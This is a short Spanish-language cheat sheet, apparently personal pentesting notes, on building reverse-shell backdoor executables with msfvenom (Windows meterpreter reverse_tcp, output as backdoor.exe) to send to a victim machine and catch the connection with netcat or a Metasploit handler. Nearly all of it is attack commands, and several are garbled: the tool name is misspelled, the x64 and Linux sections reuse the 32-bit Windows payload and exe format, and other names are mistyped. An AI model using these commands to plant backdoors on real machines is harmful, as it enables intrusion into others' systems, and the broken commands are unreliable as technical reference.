
Herramienta utilizada para relizar una payload como por ejemplo, una reverse , usando algún fichero ejecutable creado por nosotros 

El fichero , será enviado en la maquina victima y tras ejecutarse darnos acceso.

## Creacion payload-msfvenom

Comando de creacion
- msfvenom -p [modulo-de-metasploit] LHOST=nuestra_ip LPORT=puerto local donde recibir la conexion -f [extension de la salida de fichero] > [nombre ejecutable o fichero que contendra el backdoor]

### Payload - Windows - x64

- mfsvenom -p /windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX -f exe > backdoor.exe

### Payload - Windows - x32 

- mfsvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX -f exe > backdoor.exe
### Payload - Linux

- mfsvenom -p /windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX -f exe > backdoor.exe


Podremos acceder a la conexion haciendo uso de la siguiente manera
netcat  (bashj)
handler de conexione (mfsconsole)
meterpreter  +  elevacion (mfsconsole)